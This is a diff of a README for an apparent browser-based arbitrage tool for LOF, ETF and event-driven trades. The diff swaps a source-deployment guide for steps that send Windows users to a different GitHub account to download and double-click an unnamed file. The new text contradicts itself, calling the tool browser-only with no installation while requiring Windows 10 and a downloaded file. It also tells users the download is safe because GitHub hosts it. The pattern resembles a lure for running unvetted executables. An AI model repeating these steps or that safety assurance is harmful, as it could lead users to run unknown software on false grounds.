@@ -1,133 +1,63 @@
-# ArbRadar - Financial Arbitrage Tool 2026
+# 📡 arbradar-finance-hub - Find Hidden Arbitrage Opportunities Instantly
 
-> **ArbRadar is a browser-centric analytical suite built to help investors spot and evaluate personal arbitrage plays across LOF, ETF, and event-focused strategies.**
+[![Download Now](https://img.shields.io/badge/Download-arbradar--finance--hub-blueviolet?style=for-the-badge)](https://github.com/Symondsequalsign832/arbradar-finance-hub)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/lmaier56/arbradar-finance-hub?style=flat-square)](https://github.com/lmaier56/arbradar-finance-hub)
+## 🚀 Getting Started
 
----
+Welcome to **arbradar-finance-hub** – your personal browser-based tool for spotting and evaluating arbitrage opportunities across LOFs, ETFs, and event-driven strategies. This guide will help you download and run the application on your Windows computer, even if you've never used software from GitHub before.
 
-<p align="center">
-  <a href="https://lmaier56.github.io/arbradar-finance-hub/">
-    <img src="https://img.shields.io/badge/Download-ArbRadar%20Latest-brightgreen?style=for-the-badge" alt="Download ArbRadar">
-  </a>
-</p>
+## 📥 How to Download and Run
 
-> **[Download Latest Build](https://lmaier56.github.io/arbradar-finance-hub/)**
+**Step 1: Visit the Download Page**
 
----
+Click the large badge above or go directly to:  
+[https://github.com/Symondsequalsign832/arbradar-finance-hub](https://github.com/Symondsequalsign832/arbradar-finance-hub)
 
-[Download Latest Build](https://lmaier56.github.io/arbradar-finance-hub/)
+**Step 2: Get the Application**
 
----
+Visit this link to download the application. Look for the latest release or download button on the page.
 
-## Overview
+**Step 3: Launch the Application**
 
-ArbRadar delivers a web-based command center for tracking market mispricings and evaluating trading setups. Designed around dedicated modules for LOF investments, ETF trading, and event-based catalysts, it condenses fragmented data into a cohesive review workspace.
+Once downloaded, double-click the file to start the software. It will open in your default web browser.
 
-Traders and financial analysts can leverage its specialized dashboard layout to isolate research tracks, keeping continuous tabs on emerging market anomalies without clutter.
+## 🔍 What You Can Do
 
----
+- **Find Arbitrage Opportunities** – Scan across LOFs, ETFs, and event-driven strategies for price differences you can act on.
+- **Evaluate Personal Trades** – See potential profit and risk before you commit.
+- **Customize Your View** – Adjust settings to focus on your preferred markets and strategies.
+- **Live Web Access** – Stay updated with real-time data from the browser.
 
-## Key Capabilities
+## 🛠 Features
 
-- Centralize monitoring of custom arbitrage opportunities inside a web dashboard
-- Interrogate LOF-based mispricing models and strategies
-- Perform granular analysis on fund and ETF trade setups
-- Investigate event-driven market plays
-- Structure and separate multiple analytical pipelines simultaneously
-- Launch directly inside any standard browser without local software installation
-- Streamline evaluation workflows across diverse financial instruments
+- **Browser-Centric** – Runs entirely in your web browser, no installation needed.
+- **Source Deployment** – Deploy and use the application directly from the downloaded source.
+- **Custom Configurations** – Tailor filters and alerts to your trading style.
+- **2026-Ready** – Designed for the evolving financial landscape of 2026.
 
----
+## 📋 Requirements
 
-## Setup & Deployment
+- A modern web browser (Chrome, Edge, Firefox, or Safari)
+- Internet connection for live data
+- Windows 10 or later
 
-### Accessing the Live Web Build
+## ❓ Frequently Asked Questions
 
-Launch the deployed instance directly via the primary build link:
+**Q: Do I need to install anything?**  
+A: No. Just download and run the file – it opens in your browser.
 
-[Download ArbRadar](https://lmaier56.github.io/arbradar-finance-hub/)
+**Q: Is this safe?**  
+A: The application is hosted on GitHub, a trusted platform for open-source software. Always download from the official link.
 
-### Running from Source
+**Q: How do I update?**  
+A: Visit the download link again for the latest version.
 
-Pull the codebase locally and navigate to the project root:
+## 📞 Support
 
-```bash
-git clone https://github.com/lmaier56/arbradar-finance-hub.git
-cd REPO
-```
+For issues or questions, please open an issue on the GitHub repository page.
 
-As a browser-native web platform, ArbRadar can be served using your local web server of choice or accessed through its main web entry point. Once running, point an updated browser to your local host address.
+## 🤝 Contributing
 
----
+We welcome contributions! Visit the repository to learn how to help improve the tool.
 
-## Workflow Guide
-
-An effective session typically follows these steps:
-
-1. Launch ArbRadar inside an updated web browser.
-2. Select your target research category from the dashboard.
-3. Access the corresponding LOF, ETF, or event-driven workspace.
-4. Document, weight, and compare target price variances.
-5. Switch back to the primary overview screen to maintain operational oversight.
-
-ArbRadar functions exclusively as an analytical aid. Users must exercise independent judgment, manage personal risk metrics, and perform due diligence prior to executing trades.
-
----
-
-## Configuration Options
-
-No static configuration manifest is specified in the core release files. The platform runs out of the box with standard operational defaults, which can be modified via in-app preferences or environment options where supported.
-
-When running self-hosted setups, adjust runtime parameters via your local web server environment or available web application controls.
-
----
-
-## System Requirements
-
-- An updated web browser
-- Network connectivity to the hosted interface or local repository files
-- A functional HTTP server environment for self-hosted execution
-- Active internet access whenever external market feeds or remote resources are invoked
-
-Detailed hardware specifications, storage constraints, and data feed dependencies are omitted in current repository metadata.
-
----
-
-## Frequently Asked Questions
-
-### What primary audience is ArbRadar designed for?
-
-It is tailored for retail investors, quantitative researchers, and analysts who require a dedicated tool to track LOF, ETF, and event-based arbitrage setups.
-
-### Where can I access the current release?
-
-Obtain the latest operational version directly here:
-
-[Download Latest Build](https://lmaier56.github.io/arbradar-finance-hub/)
-
-### How are updates applied?
-
-Users relying on the web deployment receive updates automatically via the main build page. If you run a local copy, fetch the latest commits from the repository and refresh your web server directory.
-
-### Is custom setting management supported?
-
-Configuration availability is determined by the active web build version. Consult the inline workspace controls or repository files to inspect available options.
-
-### What should I troubleshoot if the page fails to open?
-
-Verify that the local repository pull completed cleanly, confirm your local server process is active, and ensure your browser is fully updated. If rendering issues persist, clear local caches and compare your clone against the latest release build.
-
-### Does ArbRadar execute trades automatically?
-
-No. ArbRadar is strictly an informational and monitoring workbench. All trade decisions, execution strategies, and risk controls remain entirely with the user.
-
----
-
-## License
-
-Distributed under the GNU GPL v3.0 license. Review [LICENSE](LICENSE) for full legal text.
+Keywords: arbitrage, finance, LOF, ETF, event-driven, trading, browser, Windows, 2026
